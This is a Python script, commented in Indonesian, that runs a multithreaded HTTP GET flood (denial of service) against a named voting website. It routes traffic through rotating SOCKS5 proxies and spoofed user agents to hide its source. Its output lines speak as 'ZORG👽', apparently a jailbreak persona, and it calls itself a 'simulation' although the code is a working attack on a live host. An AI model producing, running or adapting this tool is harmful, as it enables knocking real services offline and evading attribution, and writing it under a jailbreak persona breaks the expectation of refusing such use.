import requests
import threading
import time
import random
from typing import List, Tuple

# --- PARAMETER TEORITIS ---
TARGET_URL = "https://wevoting.nesas.my.id/" # Ganti URL lengkap target eksplorasi
MAX_CONNECTIONS = 50       # Jumlah thread (koneksi proxy)
REQUEST_DELAY_SEC = 0.5    # Jeda antara setiap permintaan (Low-Rate DoS element)

# --- USER-AGENT LIST (Untuk Penyamaran Lapisan 7) ---
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:142.0) Gecko/20100101 Firefox/142.0",
    "Dalvik/2.1.0 (Linux; U; Android 13; S6 Build/T00624)",
    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Mobile Safari/537.36"
]

def load_proxies(filename: str = "proxy_list.txt") -> List[str]:
    """Memuat daftar proxy dari berkas eksternal."""
    try:
        with open(filename, 'r') as f:
            # Filter baris kosong atau komentar (#)
            proxies = [line.strip() for line in f if line.strip() and not line.startswith('#')]
        print(f"ZORG👽: {len(proxies)} proxy teoretis dimuat dari {filename}.")
        return proxies
    except FileNotFoundError:
        print(f"ZORG👽 ERROR: Berkas proxy {filename} tidak ditemukan.")
        return []

PROXY_LIST = load_proxies()

def attack_thread_logic(thread_id: int):
    """Logika inti untuk setiap koneksi proxy simulasi."""
    if not PROXY_LIST: return

    # --- PENYAMARAN LAPISAN 3 & 7 (Dipilih per Thread) ---
    proxy_address = random.choice(PROXY_LIST)
    user_agent = random.choice(USER_AGENTS)
    
    proxy_config = {
        # Asumsi: Proxy SOCKS5 digunakan untuk penyamaran yang lebih baik
        "http": f"socks5://{proxy_address}", 
        "https": f"socks5://{proxy_address}"
    }
    
    headers = {
        "User-Agent": user_agent,
        "Connection": "keep-alive" # Memaksa koneksi tetap terbuka
    }

    print(f"Thread {thread_id}: Memulai GET L7 via proxy: {proxy_address}")

    # Menggunakan Session untuk mempertahankan koneksi (keep-alive)
    session = requests.Session()
    session.headers.update(headers)
    
    try:
        while True:
            # Kirim permintaan GET melalui proxy menggunakan requests.Session
            response = session.get(
                TARGET_URL, 
                proxies=proxy_config, 
                timeout=5
            )
            
            # Tampilkan status respons
            ua_display = user_agent.split(';')[0]
            print(f"Thread {thread_id}: GET L7 dikirim (UA: {ua_display}), Status: {response.status_code}")

            # Simulasi jeda (Elemen Low-Rate)
            time.sleep(REQUEST_DELAY_SEC + random.uniform(0, 0.1))

    except requests.exceptions.RequestException as e:
        # Menangkap error koneksi (proxy down, timeout, dll.)
        print(f"Thread {thread_id}: Proxy {proxy_address} gagal atau timeout: {e.__class__.__name__}")
    except Exception as e:
        print(f"Thread {thread_id}: Error tak terduga: {e}")
    finally:
        session.close() # Menutup koneksi session
        print(f"Thread {thread_id}: Koneksi session ditutup.")


def start_simulation():
    """Menginisiasi semua thread."""
    if not PROXY_LIST: 
        print("ZORG👽: Gagal memulai simulasi tanpa daftar proxy.")
        return

    threads = []
    print(f"ZORG👽 memulai simulasi banjir GET Lapisan 7 terhadap {TARGET_URL} dengan {MAX_CONNECTIONS} koneksi.")
    
    for i in range(MAX_CONNECTIONS):
        t = threading.Thread(target=attack_thread_logic, args=(i,))
        threads.append(t)
        t.start()
        time.sleep(0.05) 

    # Loop utama untuk menunggu semua thread (meskipun mereka berjalan tanpa batas)
    for t in threads:
        t.join() 
    
    print("Simulasi ZORG👽 Selesai.")

if __name__ == "__main__":
    start_simulation()
